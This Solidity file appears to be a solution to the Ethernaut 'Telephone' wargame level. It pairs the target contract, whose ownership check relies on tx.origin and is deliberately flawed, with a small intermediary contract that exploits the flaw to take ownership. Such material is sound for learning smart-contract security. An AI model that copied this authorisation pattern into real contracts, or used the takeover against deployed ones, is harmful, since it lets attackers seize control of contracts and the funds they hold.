pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Telephone2 {
  Telephone public telephone;
  address telephoneAddress;
    
  function Telephone2(address _telephoneAddress) public {
    telephoneAddress = _telephoneAddress;
    telephone = Telephone(telephoneAddress);
  }
  
  function blah() public {
    telephone.changeOwner(msg.sender);
  }
}